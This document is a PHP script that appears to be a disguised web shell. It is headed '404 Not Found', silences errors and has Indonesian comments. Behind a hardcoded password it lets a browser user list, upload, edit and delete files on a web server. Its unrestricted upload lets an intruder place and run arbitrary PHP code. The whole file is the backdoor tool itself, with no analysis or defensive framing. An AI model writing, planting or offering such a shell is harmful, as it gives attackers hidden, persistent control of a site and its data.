<?php
/* ===============================
   404 Not Found
   =============================== */

/* ===== CONFIG ===== */
$PASSWORD = '133725'; // WAJIB ganti
$ROOT_DIR = __DIR__;           // sandbox (tidak bisa keluar)

/* ===== SECURITY ===== */
session_start();
error_reporting(0);

function safe_path($path) {
    global $ROOT_DIR;
    $real = realpath($path);
    if ($real === false || strpos($real, $ROOT_DIR) !== 0) {
        return false;
    }
    return $real;
}

/* ===== LOGIN ===== */
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['login'] = true;
        header("Location: ?");
        exit;
    }
    echo '<form method="post">
        <h3>Login</h3>
        <input type="password" name="pass">
        <button>Login</button>
    </form>';
    exit;
}

/* ===== PATH ===== */
$cwd = isset($_GET['p']) ? safe_path($_GET['p']) : $ROOT_DIR;
if (!$cwd) $cwd = $ROOT_DIR;

/* ===== UPLOAD ===== */
if (isset($_FILES['upload'])) {
    $name = basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $cwd.'/'.$name);
}

/* ===== SAVE FILE ===== */
if (isset($_POST['save'])) {
    $file = safe_path($cwd.'/'.basename($_POST['file']));
    if ($file && is_file($file)) {
        file_put_contents($file, $_POST['content']);
    }
}

/* ===== DELETE FILE ===== */
if (isset($_GET['del'])) {
    $file = safe_path($cwd.'/'.basename($_GET['del']));
    if ($file && is_file($file)) {
        unlink($file);
        header("Location: ?p=".urlencode($cwd));
        exit;
    }
}

/* ===== UI ===== */
echo "<style>
body{background:#111;color:#eee;font-family:Arial}
a{color:#6cf;text-decoration:none}
textarea{width:100%;height:300px;background:#222;color:#eee}
</style>";

echo "<h3>PATH: {$cwd}</h3>";

/* ===== UPLOAD FORM ===== */
echo '<form method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<button>Upload</button>
</form><hr>';

/* ===== EDIT MODE ===== */
if (isset($_GET['edit'])) {
    $file = safe_path($cwd.'/'.basename($_GET['edit']));
    if ($file && is_file($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<form method='post'>
            <input type='hidden' name='file' value='".basename($file)."'>
            <textarea name='content'>{$content}</textarea><br>
            <button name='save'>Save</button>
        </form><hr>";
    }
}

/* ===== LIST ===== */
$items = scandir($cwd);
echo "<ul>";
foreach ($items as $i) {
    if ($i === '.') continue;
    $path = $cwd.'/'.$i;
    if ($i === '..' && $cwd === $ROOT_DIR) continue;

    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?p=".urlencode($path)."'>$i</a></li>";
    } else {
        echo "<li>[FILE] $i 
        <a href='?edit=".urlencode($i)."&p=".urlencode($cwd)."'>[edit]</a>
        <a href='?del=".urlencode($i)."&p=".urlencode($cwd)."' 
           onclick=\"return confirm('Hapus file ini?')\">[delete]</a>
        </li>";
    }
}
echo "</ul>";
